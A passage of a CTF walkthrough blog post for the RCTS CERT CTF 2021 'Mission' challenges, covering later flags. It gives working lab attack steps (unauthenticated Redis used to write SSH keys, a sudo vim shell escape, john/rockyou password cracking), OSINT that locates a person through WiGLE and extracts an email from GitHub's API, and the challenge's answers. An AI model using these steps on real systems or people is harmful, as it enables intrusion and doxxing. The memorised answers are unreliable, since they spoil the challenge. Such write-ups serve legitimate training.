u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;--.++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+++.---\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;--.++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+++.---\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;--.++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+.-\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;--.++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+++.---\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;---.+++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;++.--\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;--.++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;-.+\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;----.++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;.\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;+++.---\u0026lt;\u0026lt;\u0026lt;\u0026lt;. I think this pattern is familiar to me, It\u0026rsquo;s Brainfuck language, Let\u0026rsquo;s solve it!\nYes, We got it !\nThe fifth flag :\nflag{Hyp3r10n_th3_g0d_0f_l1ght!}\n6-Blue team becomes Red Team The table is reversed now, It\u0026rsquo;s our turn to attack now :smiling_imp:.\nFirst, We need to setup the machine in our local network.\nIt is named as hyp3r10n and assigned with ip address 192.168.1.4.\nLet\u0026rsquo;s do nmap to scan all the ports that are opened in that machine.\nThere are 3 opened ports for SSH, HTTP and Redis.\nIf we opened the web page it looks like the same as the previous challenge.\nI think we need to know more about the Redis service and what is it\u0026rsquo;s function, This Link will help us.\nAfter some enumeration we found out that we can gain access to the machine through the Redis server.\nAnd we will do it in a way like this Document, Let\u0026rsquo;s start it.\nFirst, We have to connect to the server with this command redis-cli -h 192.168.1.4.\nThen, we type config get * to find the home of the redis user (usually /var/lib/redis or /home/redis/.ssh).\nAlso we found the home of the redis user is located in /var/lib/redis.\nNow we can write the authenticated_users file to access via ssh with the user redis.\nWe will follow this steps to gain access through SSH to the machine.\n1 2 3 4 5 6 7 1-Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa 2-Write the public key to a file : (echo -e \u0026#34;\\n\\n\u0026#34;; cat ./.ssh/id_rsa.pub; echo -e \u0026#34;\\n\\n\u0026#34;) \u0026gt; foo.txt 3-Import the file into redis : cat foo.txt | redis-cli -h 10.85.0.52 -x set crackit 4-Save the public key to the authorized_keys file on redis server: And what what we have done.\nNow the last step is to connect to the machine with ssh ssh -i id_rsa redis@192.168.1.4.\nNOTE Use the same passphrase as the one you\u0026rsquo;ve set at ssh_key.\nYes, We are in!\nBut we entered with redis service .. We need to escalate to the user privilage.\nIt looks like there is a user named as hype, maybe we can escalate to it.\nSo, We can escalate to hype by typing this command sudo -u hype /usr/bin/vim /home/hype/backup.sh.\nIt will open the backup.sh with Vim under hype privilage.\nThen inside vim we type :!/bin/ash, then hit enter.\nYes, we are now hype :partying_face:.\nNow let\u0026rsquo;s head to /home/hype and see what is inside!\nLet\u0026rsquo;s see what is inside user.txt ?\nIt is the flag!\nThe sixth flag :\nflag{succ3ssfully_1nf1ltr4t3d}\n7-Getting the crown jewels It seems that there is a Private SSH key that we can make use of it..But first we need to find it and crack it\u0026rsquo;s password.\nIf we navigate through backups we will find ssh directory, When we enter it we will find note.txt and id_rsa.bak.\nIf we opened note.txt, it says This is a backup of my private key, just in case, So id_rsa.bak contains the Private SSH key.\nLet\u0026rsquo;s try to Brute-force it!\nWe will use our friend JohnTheRipper Tool and specially it\u0026rsquo;s module ssh2john.\nFirst, We convert the id_rsa.bak into Hash with this command, python ssh2john.py id_rsa \u0026gt; id_rsa.hash\nThen, We Brute-force the password hash with a wordlist that containa alot of passwords.\nWe will use the most famous wordlist which is Rockyou.\njohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash.\nHurray! We got the password which is barcelona1.\nBut what is this password for? :thinking:\nLet\u0026rsquo;s see if we can escalate to root privilage with this password.\nYes, We are now have root privilage :partying_face:.\nLet\u0026rsquo;s head to root directory and see what is inside of it!\nLet\u0026rsquo;s see what is inside root.txt!\nYes, It is the flag!\nThe seventh flag :\nflag{h4ck1ng_th3_h4ck3r}\n8-Locating our Attacker Note This is different flag format, we need BSSID and email in this format ** flag{\u0026lsquo;BSSID\u0026rsquo;_\u0026rsquo;email\u0026rsquo;}**\nNow we need to locate the hacker, We found a home.zip inside the root directory.\nUnfortunately, It is protected with a password.\nSo, We have to Brute-force this password.\nAgain we will use JohnTheRipper, But this time we use another module which is zip2john.\nzip2john home.zip \u0026gt; hash.txt, Then john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\nLuckily, The password was also barcelona1.\nWhen we unzipped the home.zip, It gave us two outputs which are IMG_3953.JPG and Wifi config.txt.\nIf we opened the image this is how it looks.\nand if we opened Wifi config.txt, This is the output.\n1 2 SSID: MOVISTAR_56F7 Pwd: barcelona1 I think we will do some OSINT operation :smiling_imp:.\nWe will use WiGLE.net website..It\u0026rsquo;s link Here.\nWiGLE.net WiGLE.net is a submission-based catalog of wireless networks. Submissions are not paired with actual people; rather name/password identities which people use to associate their data. It\u0026rsquo;s basically a \u0026ldquo;gee isn\u0026rsquo;t this neat\u0026rdquo; engine for learning about the spread of wireless computer usage. First, We will head back to image to see if there is any information about it\u0026rsquo;s location.\nIt seems that the image is taken for a pharmacy in Barcelona, Spain and named as Farmacia J. C. Martinez.\nLet\u0026rsquo;s search for it in WiGLE.net map !\nAfter this we need to copy the Latitude and Longitude.\n1 2 3 Latitude : 41.3746 to 41.3923 Longitude : 2.137 to 2.1846 Now let\u0026rsquo;s head to the View section and then Basic Search.\nThen, We fill all the information about the WIFI Configuration.\nYes, We found it!\nWe found the BSSID : F8:8E:85:C6:56:F8, Now we need to find the Hacker\u0026rsquo;s E-mail.\nLet\u0026rsquo;s head back to our root directory, Then Projects \u0026gt; Scripts.\nAnd we type ls -al to list all the contents in the directory whether hidden or not.\nAs we can see those scripts rshell.ino and wifigrabber.ino were used by the hacker to hack the WIFI.\nIf we opened them, It won\u0026rsquo;t led to anything.\nLet\u0026rsquo;s see what is inside .git directory.\nLet\u0026rsquo;s view FETCH_HEAD and see what does it show!\n1 da59093e90bdad57ad87f67d295a5e85ded7f941 branch \u0026#39;main\u0026#39; of https://github.com/mateossanti0/scripts Well, We have a Github Account, Let\u0026rsquo;s go to the link!\nNow, We need to get the Email Address from this Github user account.\nCopy and paste the next line into your browser (feel free to bookmark it): https://api.github.com/users/xxxxxxx/events/public\nFind the GitHub username for which you want the email:\nReplace the xxxxxxx in the URL with the person’s GitHub username.\nHit Enter.\nPress Ctrl+F and search for “email”.\nWe found the Hacker\u0026rsquo;s Email Address which is mateossanti0@gmail.com :partying_face:!\nNow Let\u0026rsquo;s combine the BSSID and email in this format ** flag{\u0026lsquo;BSSID\u0026rsquo;_\u0026rsquo;email\u0026rsquo;}**\nThe eighth flag :\nflag{F8:8E:85:C6:56:F8_mateossanti0@gmail.com}\n9-Crime doesn\u0026rsquo;t pay Now we are done with the hacker, We need to finish the report with some information regarding the incident.\nQ1 : What was the first service to be accessed in Mission challenge 1? (flag1 = \u0026lsquo;service name\u0026rsquo;)\nflag1 = ftp\nQ2 : What is the IP address of the payload on the Excel macro vba, in Mission challenge 2? (flag2 = \u0026lsquo;IP Address\u0026rsquo;)\nflag2 = 192.0.2.132\nQ3 : What file is used to enable the default login method in Mission challenge 3? (flag3 = \u0026rsquo;name of the file\u0026rsquo;)\nflag3 = sshd_config\nQ4 : What is the malicious domain used in the persistant reverse shell, in Mission challenge 4? (flag4 = \u0026lsquo;subdomain\u0026rsquo;)\nflag4 = c2.m1cr0s0ft.hax\nQ5 : What is the video file name running in the Hyperion website, on Mission challenge 5? (flag5 = \u0026lsquo;video file name\u0026rsquo;)\nflag5 = bg.mp4\nQ6 : What is the name of the oldest site backup in the backup folder, in Mission challenge 6? (flag6 = \u0026lsquo;backup file name\u0026rsquo;)\nflag6 = site_backup_Jul-06-21.tar.gz\nQ7 : What is the name of the attacker, found on Mission challenge 8? (flag7 = \u0026lsquo;FirstName\u0026rsquo;_\u0026lsquo;LastName\u0026rsquo;)\nflag7 = Mateos_Santiago\nWow, That was alot of questions :rofl:.\nFinally, We need to stick all of them together in this format:\nFlag format: flag{flag1_flag2_flag3_flag4_flag5_flag6_flag7}\nThe ninth flag :\nflag{ftp_192.0.2.132_sshd_config_c2.m1cr0s0ft.hax_bg.mp4_site_backup_Jul-06-21.tar.gz_Mateos_Santiago}\nWe are finally Done !! :partying_face: I really enjoyed this series of challenges, and I\u0026rsquo;m looking forward to solve more and more challenges and make writeups for them. Lastly, I\u0026rsquo;d like to thank my team Cyb3rTh1eveZ and people who encouraged me to make the writeup and also the people who helped me to be on the way i am. That is all of it..Happy Hunt :smiling_imp:! ","date":"2021-08-24T00:00:00Z","image":"https://AbdallahAdham.com/post/Mission_RCTS/missionCTF.jpg","permalink":"https://AbdallahAdham.com/p/mission-challenges-walkthrough-rcts-cert-ctf-2021/","title":"Mission Challenges Walkthrough - RCTS CERT CTF 2021"}]